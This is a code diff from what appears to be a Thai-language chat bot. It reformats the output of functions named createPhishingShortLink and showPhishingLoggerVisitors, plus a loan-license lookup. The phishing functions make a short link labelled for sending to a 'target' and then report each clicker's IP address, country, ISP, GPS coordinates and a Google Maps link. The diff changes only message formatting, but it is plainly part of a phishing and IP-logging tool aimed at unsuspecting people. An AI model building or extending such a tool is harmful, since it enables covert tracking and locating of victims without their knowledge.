@@ -889,7 +889,15 @@ async function createPhishingShortLink(targetUrl) {
       creation_date: result.creation_date
     };
 
-    return `✅ สร้างลิ้งค์สำเร็จแล้ว\nรหัสid: ${result.id}\nลิ้งค์คือ: ${result.shortlink}\n`;
+    return `🎣 Phishing
+
+╭ ✅ สร้างลิงก์เรียบร้อย
+├ 📂 รหัส ID ตรวจสอบ: ${result.id}
+╰ 🔗 ลิงก์ส่งให้เป้าหมาย: ${result.shortlink}
+
+╭ ⚠️ หมายเหตุ
+├ ให้นำรหัส ID ข้างต้นไปตรวจสอบ
+╰ ใช้คำสั่ง: chphis%${result.id}`;
   } catch (error) {
     return '❌ Failed to create short link: ' + (error.response?.data?.message || error.message);
   }
@@ -912,19 +920,21 @@ async function showPhishingLoggerVisitors(id) {
     const visits = response.data?.result || [];
     if (!visits.length) return '🔍 ยังไม่มีคนกดลิงก์หรือถูกกรองหมดแล้ว';
 
-    let msg = '';
-    visits.forEach((visit, idx) => {
-      msg += `👤 Visitor #${idx + 1}:\n`;
-      msg += `- IP: ${visit.ip || '-'}\n`;
-      msg += `- ประเทศ: ${visit.country || '-'}\n`;
-      msg += `- อำเภอ: ${visit.city || '-'}\n`;
-      msg += `- สัญญาณ: ${visit.isp || '-'}`;
-      if (visit.lat && visit.lng) {
-        msg += `\n- พิกัด: ${visit.lat},${visit.lng}`;
-        msg += `\n- ลิ้งค์googlemap: https://www.google.com/maps?q=${visit.lat},${visit.lng}`;
-      }
-      msg += '\n----------------------\n';
-    });
+    let msg = '🎣 Phishing\n\n';
+
+visits.forEach((visit, idx) => {
+  msg += `╭ 📂 ลำดับ ${idx + 1}\n`;
+  msg += `├ IP: ${visit.ip || '-'}\n`;
+  msg += `├ ประเทศ: ${visit.country || '-'}\n`;
+  msg += `├ เครือข่าย: ${visit.isp || '-'}\n`;
+
+  if (visit.lat && visit.lng) {
+    msg += `├ พิกัด: ${visit.lat},${visit.lng}\n`;
+    msg += `╰ Google map: https://www.google.com/maps?q=${visit.lat},${visit.lng}\n\n`;
+  } else {
+    msg += `╰ พิกัด: -\n\n`;
+  }
+});
 
     return limitLineMessage(msg);
   } catch (err) {
@@ -1876,16 +1886,16 @@ async function searchLoanLicense(appName) {
       return '❌ ไม่พบข้อมูลใบอนุญาตสินเชื่อสำหรับแอปนี้';
     }
 
-    let msg = `🏦 ข้อมูลใบอนุญาตสินเชื่อ (${appName})\n====================\n`;
+    let msg = `🏦 ข้อมูลใบอนุญาตสินเชื่อ (${appName})\n\n`;
     data.results.forEach((item, idx) => {
-      const row = item.rowData || {};
-      msg += `[${idx + 1}]\n`;
-      msg += `📱 แอป: ${stripHtml(row.nameapp)}\n`;
-      msg += `🏢 บริษัท: ${stripHtml(row.namecompany)}\n`;
-      msg += `🏠 ติดต่อ: ${stripHtml(row.contact)}\n`;
-      msg += `🔗 ลิงก์: ${stripHtml(row.link)}\n`;
-      msg += '====================\n';
-    });
+  const row = item.rowData || {};
+
+  msg += `╭ 📂 ลำดับ ${idx + 1}\n`;
+  msg += `├ 📱 แอป: ${stripHtml(row.nameapp)}\n`;
+  msg += `├ 🏢 บริษัท: ${stripHtml(row.namecompany)}\n`;
+  msg += `├ 📍 ติดต่อ: ${stripHtml(row.contact)}\n`;
+  msg += `╰ 🔗 ลิงก์: ${stripHtml(row.link)}\n\n`;
+});
 
     return limitLineMessage(msg);
   } catch (e) {
